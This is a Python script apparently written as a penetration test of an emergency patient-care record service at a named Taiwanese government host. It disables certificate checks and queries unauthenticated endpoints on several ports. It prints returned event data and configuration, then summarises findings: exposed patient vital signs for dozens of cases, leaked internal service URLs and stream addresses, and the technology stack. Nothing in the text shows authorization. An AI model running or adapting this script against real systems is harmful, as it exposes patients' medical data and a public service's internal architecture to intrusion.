import http.client
import json
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

print("=== EPCR 渗透测试 - 关键发现汇总 ===\n")

# 1. 测试 4001 /events 的未授权访问
print("1. 4001 /events 未授权访问测试:")
try:
    conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=10, context=ctx)
    conn.request('GET', '/events')
    resp = conn.getresponse()
    data = resp.read().decode('utf-8', errors='replace')
    print(f"   GET /events: {resp.status}")
    if resp.status == 200:
        events = json.loads(data)
        print(f"   ✓ 发现 {len(events)} 条事件数据 (未授权)")
        print(f"   示例: {json.dumps(events[0], ensure_ascii=False, indent=2)[:300]}")
    conn.close()
except Exception as e:
    print(f"   Error: {e}")

# 2. 测试 4000 /config
print("\n2. 4000 /config 配置泄露:")
try:
    conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4000, timeout=10, context=ctx)
    conn.request('GET', '/config')
    resp = conn.getresponse()
    data = resp.read().decode('utf-8', errors='replace')
    print(f"   GET /config: {resp.status}")
    if resp.status == 200:
        print(f"   ✓ 配置信息泄露")
        print(f"   数据: {data[:500]}")
    conn.close()
except Exception as e:
    print(f"   Error: {e}")

# 3. 测试 4002 /config
print("\n3. 4002 /config 配置泄露:")
try:
    conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4002, timeout=10, context=ctx)
    conn.request('GET', '/config')
    resp = conn.getresponse()
    data = resp.read().decode('utf-8', errors='replace')
    print(f"   GET /config: {resp.status}")
    if resp.status == 200:
        print(f"   ✓ 配置信息泄露")
        print(f"   数据: {data[:500]}")
    conn.close()
except Exception as e:
    print(f"   Error: {e}")

# 4. 测试 4003 /config
print("\n4. 4003 /config 配置泄露:")
try:
    conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4003, timeout=10, context=ctx)
    conn.request('GET', '/config')
    resp = conn.getresponse()
    data = resp.read().decode('utf-8', errors='replace')
    print(f"   GET /config: {resp.status}")
    if resp.status == 200:
        print(f"   ✓ 配置信息泄露")
        print(f"   数据: {data[:500]}")
    conn.close()
except Exception as e:
    print(f"   Error: {e}")

# 5. 测试版本信息
print("\n5. 版本信息:")
for port in [4000, 4001, 4002, 4003, 4004]:
    try:
        conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', port, timeout=5, context=ctx)
        conn.request('GET', '/version')
        resp = conn.getresponse()
        data = resp.read().decode('utf-8', errors='replace')
        if resp.status == 200:
            print(f"   {port}/version: {data}")
        conn.close()
    except:
        pass

# 6. 测试 4004 登录端点
print("\n6. 4004 认证端点:")
try:
    conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4004, timeout=5, context=ctx)
    conn.request('GET', '/captcha')
    resp = conn.getresponse()
    print(f"   GET /captcha: {resp.status} ({len(resp.read())} bytes)")
    conn.close()
except Exception as e:
    print(f"   Error: {e}")

# 7. 总结
print("\n=== 关键发现 ===")
print("""
[高] 1. 4001 /events 未授权访问
     - 可读取所有 PCDT 事件数据
     - 包含患者生命征象 (血压、心率等)
     - 数据量: 59 个唯一 CaseID
     - 时间范围: 2018-08-14 至 2018-08-17

[中] 2. /config 端点未授权访问
     - 4000, 4002, 4003 均泄露配置
     - 暴露微服务拓扑和内部 URL
     - 包含 RTMP 流媒体地址

[低] 3. CSP 配置宽松
     - 允许 http: 源和特定 GCP IP
     - 暴露内部架构

[信息] 4. 技术栈
     - Node.js + Express
     - AngularJS 1.x
     - Socket.IO
     - JWT 认证
     - MySQL (推测)
""")
